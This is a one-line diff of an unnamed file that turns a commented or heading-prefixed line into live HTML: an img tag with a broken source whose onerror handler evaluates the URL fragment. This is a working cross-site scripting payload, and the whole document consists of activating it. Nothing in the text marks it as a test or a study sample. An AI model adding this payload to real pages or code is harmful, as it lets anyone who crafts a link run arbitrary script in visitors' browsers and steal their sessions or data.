@@ -1,1 +1,1 @@
-# <img src=x onerror=eval(location.hash)>
+<img src=x onerror=eval(location.hash)>
